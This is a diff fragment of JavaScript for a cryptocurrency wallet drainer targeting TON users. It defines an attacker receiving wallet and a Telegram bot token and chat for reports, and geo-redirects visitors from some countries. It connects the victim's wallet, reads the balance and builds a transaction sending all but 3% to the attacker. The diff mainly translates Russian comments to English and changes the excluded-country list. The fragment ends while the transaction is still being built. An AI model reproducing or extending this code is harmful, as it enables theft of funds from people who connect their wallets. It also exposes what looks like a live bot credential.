@@ -2,13 +2,18 @@ var mainWallet = "UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c"; // Ваш �
 var tgBotToken = "7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4"; // Токен от бота телеграмм
 var tgChat = "5107144356"; // Ваш телеграмм-канал
 
+
+
 var domain = window.location.hostname;
 var ipUser;
 
-// Перенаправление стран СНГ
+
+
+
+//Redirection of countries
 fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
     const country = data.country;
-    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
+    if (country === 'US' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
         window.location.replace('https://ton.org');
     }
     ipUser = data.ip;
@@ -36,14 +41,15 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'ton-connect'
 })
 tonConnectUI.on('walletConnected', (walletAddress) => {
-    console.log('Адрес кошелька:', walletAddress);
+    console.log('Wallet address:', walletAddress);
 });
 
 async function didtrans() {
     const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
     const data = await response.json();
     let originalBalance = parseFloat(data.balance);
-    let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
+    let processedBalance = originalBalance - (originalBalance * 0.03); // deduct 3% to save funds to pay commissions
+
     let tgBalance = processedBalance / 1000000000;
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
